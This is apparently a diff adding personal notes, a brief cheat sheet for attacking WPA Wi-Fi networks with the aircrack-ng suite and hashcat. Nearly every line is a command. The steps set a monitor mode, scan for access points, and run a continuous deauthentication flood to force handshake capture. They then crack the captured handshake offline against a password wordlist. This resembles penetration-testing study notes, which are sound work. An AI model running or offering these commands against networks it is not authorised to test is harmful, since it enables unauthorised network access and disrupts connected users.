@@ -1,0 +1,22 @@
+- Put interface in monitor mode
+    - sudo airmon-ng start wlan0
+
+- Scan for networks
+    - sudo airodump-ng wlan0mon
+
+- Scan on specific AP and Channel with output file
+    - sudo airodump-ng -bssid <BSSID> -c <Channel> -w <output_file> wlan0mon
+
+- Deauthenticate clients to capture handshake
+    - sudo aireplay-ng -a <BSSID> -c <Client Mac> -0 0 wlan0mon
+
+- Cracking with aircrack-ng
+    - sudo aircrack-ng <output_file>.cap -e <ESSID>
+    - sudo aircrack-ng <output_file>.cap -e <ESSID> -w /usr/share/john/password.lst
+
+- Cracking with hashcat
+    - Convert .cap to hashcat hc22000
+        - hcxpcapngtool -o <output_file>.hc22000 <output_file>.cap
+
+    - Run hashcat
+        - hashcat -m 22000 <output_file>.hc22000 -w /usr/share/john/password.lst
